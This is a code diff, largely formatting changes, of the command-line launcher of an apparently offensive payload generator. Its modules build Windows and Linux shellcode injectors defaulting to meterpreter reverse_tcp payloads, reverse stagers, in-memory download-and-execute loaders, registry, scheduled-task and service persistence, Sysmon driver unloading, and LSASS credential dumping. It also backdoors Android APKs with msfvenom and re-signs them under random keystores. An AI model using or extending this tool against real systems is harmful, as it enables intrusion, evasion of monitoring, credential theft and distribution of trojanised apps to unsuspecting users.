+    # parser.add_argument('-ps','--persistrun', help='Android Backdoored app start trigger backdoor',action='store_true',required=False)
+    # parser.add_argument('-pr','--persistreboot', help='Android Backdoor start every reboot',action='store_true',required=False)
+    parser.add_argument('-bp', '--binpath', help='File path for post/privesc/persistence module', required=False)
+    parser.add_argument('-opt1', '--option1', help='option1 for post/privesc/persistence module', required=False)
+    parser.add_argument('-opt2', '--option2', help='option2 for post/privesc/persistence module', required=False)
 
-    #parser.add_argument('-cp','--custom', help='custom payload to use in Shellcode_injection module', required=False)
+    # parser.add_argument('-cp','--custom', help='custom payload to use in Shellcode_injection module', required=False)
     args = parser.parse_args()
 
-    ModOpt={}
+    ModOpt = {}
 
-    if args.module in ["WSI","WRT","WRH","WRS","WDE","WDD","WPRG","WPKA","WPEU","WPEH","WPDT","WPDL","LSI","AOB"]:
+    if args.module in ["WSI", "WRT", "WRH", "WRS", "WDE", "WDD", "WPRG", "WPKA", "WPEU", "WPEH", "WPDT", "WPDL", "LSI",
+                       "AOB"]:
 
         if args.output == None:
             print("[ERROR] required output filename (-o)\n")
@@ -1040,7 +1121,6 @@ def CmdlineLauncher(inputarray):
         ModOpt["MemAlloc"] = args.memtype or "Heap_RWX"
 
         if "W" in args.module:
-
             ModOpt["Outformat"] = args.format or "exe"
             ModOpt["DecoyProc"] = 0
             ModOpt["EF"] = int(args.evasionfrequency or "10")
@@ -1051,7 +1131,7 @@ def CmdlineLauncher(inputarray):
         ModOpt["JI"] = int(args.junkintensity or "10")
         ModOpt["JR"] = int(args.junkreinject or "0")
 
-        if args.module in ["LSI","WSI","AOB"]:
+        if args.module in ["LSI", "WSI", "AOB"]:
 
             if args.module == "WSI":
 
@@ -1069,14 +1149,14 @@ def CmdlineLauncher(inputarray):
 
             elif args.module == "LSI":
 
-                M_type = "ShellcodeInjection_C_linux"            
+                M_type = "ShellcodeInjection_C_linux"
                 ModOpt["ExecMethod"] = args.injectmode or "Thread"
 
             elif args.module == "AOB":
 
-                M_type = "MsfvenomObfuscateBackdoor_android"            
+                M_type = "MsfvenomObfuscateBackdoor_android"
                 ModOpt["Shelltype"] = "msfvenom"
-                ModOpt["Arch"] = "dalvik"               
+                ModOpt["Arch"] = "dalvik"
 
             if args.msfvenom == None and args.custom == None:
 
@@ -1094,7 +1174,7 @@ def CmdlineLauncher(inputarray):
 
                     if args.module == "WSI":
 
-                        ModOpt["Payload"] = "windows/x64/meterpreter/reverse_tcp"                       
+                        ModOpt["Payload"] = "windows/x64/meterpreter/reverse_tcp"
                     else:
                         ModOpt["Payload"] = "linux/x64/meterpreter/reverse_tcp"
                 else:
@@ -1122,13 +1202,12 @@ def CmdlineLauncher(inputarray):
             ModOpt["CustomOpt"] = args.msfoptions or ""
 
             if args.module == "AOB":
- 
+
                 ModOpt["BackdoorApk"] = args.apkbackdoor or False
 
                 if ModOpt["BackdoorApk"] != False:
-
-                    ModOpt["RunOnAppStart"] = True #args.persistrun or False
-                    #ModOpt["RebootPersistence"] = args.persistreboot or False
+                    ModOpt["RunOnAppStart"] = True  # args.persistrun or False
+                    # ModOpt["RebootPersistence"] = args.persistreboot or False
 
             if args.encrypt != None and args.module != "AOB":
 
@@ -1136,7 +1215,7 @@ def CmdlineLauncher(inputarray):
             else:
                 ModOpt["Encode"] = "1"
 
-        elif args.module in ["WRT","WRH","WRS"]:
+        elif args.module in ["WRT", "WRH", "WRS"]:
 
             if args.module == "WRT":
 
@@ -1167,10 +1246,9 @@ def CmdlineLauncher(inputarray):
             ModOpt["Lhost"] = args.host
             ModOpt["Lport"] = args.port
 
-        elif args.module in ["WDE","WDD"]:
+        elif args.module in ["WDE", "WDD"]:
 
             if args.url == None:
-
                 print("[ERROR] downloadexec require url argument (-U)\n")
                 quit()
 
@@ -1201,19 +1279,19 @@ def CmdlineLauncher(inputarray):
                 ModOpt["cryptFile"] = False
                 ModOpt["Encode"] = "1"
 
-        elif args.module in ["WPRG","WPKA","WPEU","WPEH","WPDT","WPDL"]:
+        elif args.module in ["WPRG", "WPKA", "WPEU", "WPEH", "WPDT", "WPDL"]:
 
             if args.module == "WPRG":
                 M_type = "Persistence_C_Reg_windows"
-                ModOpt["Binpath"] = args.binpath   
+                ModOpt["Binpath"] = args.binpath
                 ModOpt["PName"] = args.option1 or RandString()
                 ModOpt["Priv"] = args.option2 or False
 
             elif args.module == "WPKA":
                 M_type = "Persistence_C_KeepAliveProcess_windows"
-                ModOpt["Binpath"] = args.binpath   
+                ModOpt["Binpath"] = args.binpath
                 ModOpt["Timevar"] = args.option1 or "6000"
-            
+
             elif args.module == "WPEU":
                 M_type = "Postex_C_UnloadSysmonDriver_windows"
 
@@ -1228,18 +1306,18 @@ def CmdlineLauncher(inputarray):
 
             elif args.module == "WPDT":
                 M_type = "Postex_C_MiniDumpWriteDumpLsass_windows"
-        
+
         if args.module != "AOB" and args.module != "LSI":
 
             ModOpt["UnhookNtdll"] = args.unhook or False
-            
+
             if args.masqpath != None:
                 ModOpt["PEBmasquerade"] = True
                 ModOpt["Masqpath"] = args.masqpath
                 ModOpt["Masqcmdline"] = args.masqcmd or ModOpt["Masqpath"]
             else:
                 ModOpt["PEBmasquerade"] = False
-  
+
             if args.dynamicload == True:
 
                 ModOpt["DynImport"] = True
@@ -1260,37 +1338,37 @@ def CmdlineLauncher(inputarray):
             else:
                 ModOpt["Reflective"] = False
 
-    elif args.module in ["WPRGc","WPSTc","WPSCc","WPEUc","WPEHc","WPDLc"]:
+    elif args.module in ["WPRGc", "WPSTc", "WPSCc", "WPEUc", "WPEHc", "WPDLc"]:
 
-            if args.module == "WPRGc":
-                M_type = "Persistence_CMD_Reg_windows"
-                ModOpt["Binpath"] = args.binpath   
-                ModOpt["Pname"] = args.option1 or RandString()
-                ModOpt["Priv"] = args.option2 or False
+        if args.module == "WPRGc":
+            M_type = "Persistence_CMD_Reg_windows"
+            ModOpt["Binpath"] = args.binpath
+            ModOpt["Pname"] = args.option1 or RandString()
+            ModOpt["Priv"] = args.option2 or False
 
-            elif args.module == "WPSTc":
-                M_type = "Persistence_CMD_Schtasks_windows"
-                ModOpt["Binpath"] = args.binpath
-                ModOpt["SchtMode"]= args.option1
-                ModOpt["Timevar"] = args.option2 or "0001:00"
+        elif args.module == "WPSTc":
+            M_type = "Persistence_CMD_Schtasks_windows"
+            ModOpt["Binpath"] = args.binpath
+            ModOpt["SchtMode"] = args.option1
+            ModOpt["Timevar"] = args.option2 or "0001:00"
 
 
-            elif args.module == "WPSCc":
-                M_type = "Persistence_CMD_CreateService_windows"
-                ModOpt["Binpath"] = args.binpath
-                ModOpt["Pname"]= args.option1 or RandString()
-            
-            elif args.module == "WPEUc":
-                M_type = "Postex_CMD_UnloadSysmonDriver_windows"
+        elif args.module == "WPSCc":
+            M_type = "Persistence_CMD_CreateService_windows"
+            ModOpt["Binpath"] = args.binpath
+            ModOpt["Pname"] = args.option1 or RandString()
 
-            elif args.module == "WPEHc":
-                M_type = "Postex_CMD_AttribHideFile_windows"
-                ModOpt["Binpath"] = args.binpath
+        elif args.module == "WPEUc":
+            M_type = "Postex_CMD_UnloadSysmonDriver_windows"
 
-            elif args.module == "WPDLc":
-                M_type = "Postex_CMD_comsvcsdllDumpLsass_windows"
+        elif args.module == "WPEHc":
+            M_type = "Postex_CMD_AttribHideFile_windows"
+            ModOpt["Binpath"] = args.binpath
 
-    elif args.setup == True: 
+        elif args.module == "WPDLc":
+            M_type = "Postex_CMD_comsvcsdllDumpLsass_windows"
+
+    elif args.setup == True:
 
         AutoSetup()
 
@@ -1299,18 +1377,16 @@ def CmdlineLauncher(inputarray):
         quit()
 
     if args.verbose == True:
-        
         ModOpt["verbose"] = True
 
     if args.setup == True:
 
         quit()
     else:
-        ModuleLauncher(M_type,ModOpt)
+        ModuleLauncher(M_type, ModOpt)
 
 
 def SelectEncryption(data):
-
     print(bcolors.OCRA + "\n[>] " + data + " encryption\n" + bcolors.ENDC)
     sleep(0.2)
     print("[1] none                \n")
@@ -1323,8 +1399,8 @@ def SelectEncryption(data):
 
     return enc_type
 
-def PrintEncryption(M_type,ModOpt):
 
+def PrintEncryption(M_type, ModOpt):
     if (("ShellcodeInjection" in M_type or "DownloadExec" in M_type) and "Encode" in ModOpt):
 
         if ModOpt["Encode"] == "2":
@@ -1343,93 +1419,90 @@ def PrintEncryption(M_type,ModOpt):
 
             print(bcolors.GREEN + "[>] Double-key Vigenere encryption...\n" + bcolors.ENDC)
 
-def Cleanup(ModOpt):
 
-    CleanupList = ["Source.c","Source.o","ReflectiveLoader.h","ReflectiveLoader.c","ReflectiveLoader.o","msf_gen.apk","msf_rebuild.apk"]
+def Cleanup(ModOpt):
+    CleanupList = ["Source.c", "Source.o", "ReflectiveLoader.h", "ReflectiveLoader.c", "ReflectiveLoader.o",
+                   "msf_gen.apk", "msf_rebuild.apk"]
 
     if "ShellRes" in ModOpt and ModOpt["ShellRes"]:
-
         CleanupList.append(ModOpt["Rcfile"])
         CleanupList.append(ModOpt["Resfile"])
-        CleanupList.append(ModOpt["Binfile"])        
+        CleanupList.append(ModOpt["Binfile"])
 
     for x in CleanupList:
-    
+
         try:
             os.remove(x)
         except:
             pass
-    
+
     try:
         rmtree("apk_smali")
         rmtree("msf_smali")
     except:
         pass
 
-def RequireMultiproc():
 
-    ans=YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))
+def RequireMultiproc():
+    ans = YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))
 
     if ans == True:
 
-        Procnumb=InputFunc("\n[>] Insert number of decoy processes (integer between 1-3): ")
+        Procnumb = InputFunc("\n[>] Insert number of decoy processes (integer between 1-3): ")
 
         if (Procnumb == "1") or (Procnumb == "2") or (Procnumb == "3"):
-            
             return Procnumb
     else:
         return "0"
 
 
-def ApktoolD(baksmali,name):
-
+def ApktoolD(baksmali, name):
     print(bcolors.GREEN + "\n[>] Baksmaling...\n" + bcolors.ENDC)
 
     if platform.system() == "Windows":
-        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','d',baksmali,'-o',name],shell=True)
+        subprocess.call(['java', '-jar', 'Setup/apk_sign/apktool_2.4.1.jar', 'd', baksmali, '-o', name], shell=True)
     else:
-        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','d',baksmali,'-o',name])  
-      
-def ApktoolB(smali):
+        subprocess.call(['java', '-jar', 'Setup/apk_sign/apktool_2.4.1.jar', 'd', baksmali, '-o', name])
 
+
+def ApktoolB(smali):
     print(bcolors.GREEN + "\n[>] Smaling...\n" + bcolors.ENDC)
 
     if platform.system() == "Windows":
-        
-        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','b',smali,'-o','msf_rebuild.apk'],shell=True)
+
+        subprocess.call(['java', '-jar', 'Setup/apk_sign/apktool_2.4.1.jar', 'b', smali, '-o', 'msf_rebuild.apk'],
+                        shell=True)
     else:
-        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','b',smali,'-o','msf_rebuild.apk'])
+        subprocess.call(['java', '-jar', 'Setup/apk_sign/apktool_2.4.1.jar', 'b', smali, '-o', 'msf_rebuild.apk'])
 
-        
+
 def ApkSigner(Apk_out):
-
     if ".apk" not in Apk_out:
+        Apk_out += ".apk"
 
-        Apk_out+=".apk"
-        
     print(bcolors.GREEN + "\n[>] Aligning with Zipalign..." + bcolors.ENDC)
 
-    subprocess.call(['zipalign','4','msf_rebuild.apk',Apk_out])
-    #os.rename('msf_rebuild.apk',Apk_out)
+    subprocess.call(['zipalign', '4', 'msf_rebuild.apk', Apk_out])
+    # os.rename('msf_rebuild.apk',Apk_out)
 
     print(bcolors.GREEN + "\n[>] Resigning apk...\n" + bcolors.ENDC)
-    Info=open("Setup/apk_sign/keystore_info.txt","r")
+    Info = open("Setup/apk_sign/keystore_info.txt", "r")
 
     for line in Info:
 
         if "Alias:" in line:
-            Alias=line.split()[1]
+            Alias = line.split()[1]
 
         elif "KeystorePassword:" in line:
-            KeystorePassword=line.split()[1]
+            KeystorePassword = line.split()[1]
 
-    os.system("apksigner sign --ks Setup/apk_sign/keystore.keystore --ks-key-alias " + Alias + " --ks-pass pass:" + KeystorePassword + " --key-pass pass:" + KeystorePassword + " " + Apk_out)
+    os.system(
+        "apksigner sign --ks Setup/apk_sign/keystore.keystore --ks-key-alias " + Alias + " --ks-pass pass:" + KeystorePassword + " --key-pass pass:" + KeystorePassword + " " + Apk_out)
 
 
 def KeytoolKeystore(Random):
-
     if Random:
-        
+
         Alias = RandString()
         Passw = RandString()
         Link = RandString() + ".com"
@@ -1437,10 +1510,10 @@ def KeytoolKeystore(Random):
         O = RandString()
         Loc = RandString()
         S = RandString()
-        Country = RandString()        
+        Country = RandString()
 
     else:
-  
+
         Alias = InputFunc("\n[>] Insert Keystore Alias: ")
         Passw = InputFunc("\n[>] Insert Keystore Password: ")
         Link = InputFunc("\n[>] Organization link: ")
@@ -1449,27 +1522,30 @@ def KeytoolKeystore(Random):
         Loc = InputFunc("\n[>] Locality: ")
         S = InputFunc("\n[>] State: ")
         Country = InputFunc("\n[>] Country: ")
-    
-    os.system("keytool -genkey -noprompt -alias " + Alias + " -dname \"CN=" + Link + ", OU=" + OU + " , O= " + O + ", L=" + Loc + ", S=" + S + ", C=" + Country + "\" -keystore Setup/apk_sign/keystore.keystore -keyalg RSA -keysize 2048 -validity 10000 -storepass " + Passw + " -keypass "  + Passw)
 
-    Data2Store=""
-    Data2Store+="Alias: " + Alias + "\n"
-    Data2Store+="KeystorePassword: " + Passw + "\n"
+    os.system(
+        "keytool -genkey -noprompt -alias " + Alias + " -dname \"CN=" + Link + ", OU=" + OU + " , O= " + O + ", L=" + Loc + ", S=" + S + ", C=" + Country + "\" -keystore Setup/apk_sign/keystore.keystore -keyalg RSA -keysize 2048 -validity 10000 -storepass " + Passw + " -keypass " + Passw)
 
-    with open("Setup/apk_sign/keystore_info.txt","w") as InfoKeystore:
+    Data2Store = ""
+    Data2Store += "Alias: " + Alias + "\n"
+    Data2Store += "KeystorePassword: " + Passw + "\n"
+
+    with open("Setup/apk_sign/keystore_info.txt", "w") as InfoKeystore:
 
         InfoKeystore.write(Data2Store)
-        InfoKeystore.close() 
+        InfoKeystore.close()
+
 
 def YesOrNo(Answerme):
     if (Answerme == "y") or (Answerme == "Y") or (Answerme == "yes") or (Answerme == "Yes") or (Answerme == ""):
         return True
     else:
-        return False 
+        return False
+
 
 def ModuleDescription(M_type):
-    print("\n[+] MODULE DESCRIPTION:\n") 
-    description = "" 
+    print("\n[+] MODULE DESCRIPTION:\n")
+    description = ""
 
     if M_type == "ShellcodeInjection_C_windows":
 
@@ -1482,7 +1558,7 @@ def ModuleDescription(M_type):
         description += "   > Processinject               (PI)  \n"
         description += "   > APCSpray                    (APCS)\n"
         description += "   > EarlyBird                   (EB) \n"
-        description += "   > EntryPointHijack            (EPH)\n\n"  
+        description += "   > EntryPointHijack            (EPH)\n\n"
         description += "  [>] Local Memory allocation type:\n"
         description += "   > Virtual_RWX                     \n"
         description += "   > Virtual_RW/RX                   \n"
@@ -1492,7 +1568,7 @@ def ModuleDescription(M_type):
         description += "   > Virtual_RWX                     \n"
         description += "   > Virtual_RW/RX                   \n"
         description += "   > Virtual_RW/RWX                  \n"
-        description += "   > SharedSection                   \n\n"        
+        description += "   > SharedSection                   \n\n"
         description += "  [>] Shellcode Encryption supported \n"
         description += "  [>] Shellcode can be embedded as resource\n"
         description += "  [>] AUTOCOMPILE format: exe,dll \n\n"
@@ -1503,7 +1579,7 @@ def ModuleDescription(M_type):
         description += "  [>] Local process shellcode execution type:\n"
         description += "   > Thread                          \n\n"
         description += "  [>] Local Memory allocation type:\n"
-        description += "   > Heap_RWX                        \n\n"      
+        description += "   > Heap_RWX                        \n\n"
         description += "  [>] Shellcode Encryption supported \n"
         description += "  [>] Shellcode can be embedded as resource \n"
         description += "  [>] AUTOCOMPILE format: bin \n\n"
@@ -1512,7 +1588,7 @@ def ModuleDescription(M_type):
 
         if M_type == "ReverseTcpStager_C_windows":
 
-            conn="tcp"
+            conn = "tcp"
 
         elif M_type == "ReverseHttpStager_C_windows":
 
@@ -1530,7 +1606,7 @@ def ModuleDescription(M_type):
         description += "   > Virtual_RWX                     \n"
         description += "   > Virtual_RW/RX                   \n"
         description += "   > Virtual_RW/RWX                  \n"
-        description += "   > Heap_RWX                        \n\n"     
+        description += "   > Heap_RWX                        \n\n"
         description += "  [>] AUTOCOMPILE format: exe,dll \n\n"
 
     elif M_type == "DownloadExecExe_C_windows" or M_type == "DownloadExecDll_C_windows":
@@ -1540,7 +1616,7 @@ def ModuleDescription(M_type):
             Oformat = "exe"
         else:
             Oformat = "dll"
-    
+
         description += "  Download and execute " + Oformat + " without writing on disk \n"
         description += "  [>] Remote process execution type:\n"
 
@@ -1549,7 +1625,7 @@ def ModuleDescription(M_type):
         else:
             description += "   > ReflectiveDll          (RD) \n"
             description += "   > RDAPC                       \n"
-            description += "   > ManualMap              (MM) \n\n"      
+            description += "   > ManualMap              (MM) \n\n"
         description += "  [>] File encryption supported \n"
         description += "  [>] AUTOCOMPILE format: exe,dll \n\n"
 
@@ -1576,7 +1652,7 @@ def ModuleDescription(M_type):
 
         description += "  Dump Lsass using MiniDumpWriteDump API\n"
         description += "  Require admin privilege\n"
-        description += "  [>] Outformat: exe,dll\n\n"   
+        description += "  [>] Outformat: exe,dll\n\n"
 
     elif M_type == "Postex_C_UnloadSysmonDriver_windows":
 
@@ -1615,17 +1691,17 @@ def ModuleDescription(M_type):
         description += "Task schedule using schtasks.exe\n"
         description += "  [>] Outformat: cmdline\n\n"
 
-    elif M_type == "Persistence_CMD_CreateService_windows":  
+    elif M_type == "Persistence_CMD_CreateService_windows":
 
         description += "Create new service using sc.exe\n"
         description += "  [>] Outformat: cmdline\n\n"
 
-    else: 
+    else:
         description = "None"
 
     print(description)
-    try:   
-        ans=input("  Press Enter to continue: ") 
+    try:
+        ans = input("  Press Enter to continue: ")
     except SyntaxError:
         pass
 
